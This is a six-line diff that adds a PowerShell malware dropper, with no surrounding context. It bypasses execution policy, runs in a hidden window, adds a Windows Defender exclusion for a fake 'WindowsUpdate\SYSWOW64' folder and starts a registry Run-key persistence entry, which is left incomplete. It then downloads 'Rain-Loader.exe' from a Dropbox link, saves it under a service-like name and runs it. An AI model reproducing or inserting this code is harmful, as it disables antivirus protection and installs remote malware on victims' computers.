@@ -1,0 +1,6 @@
+-ExecutionPolicy Bypass -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath C:\ProgramData\WindowsUpdate\SYSWOW64\ 2>$null
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v
+$url = "https://www.dropbox.com/scl/fi/wvt50wlexnwov2swr2mhj/Rain-Loader.exe?rlkey=e50i6n7h5454bf1p4dfkruzg9&st=uigxklq8&dl=1"
+$filePath = "C:\ProgramData\WindowsUpdate\SYSWOW64\WindowsRuntimeService.exe"
+Invoke-WebRequest -Uri $url -OutFile $filePath
+& $filePath
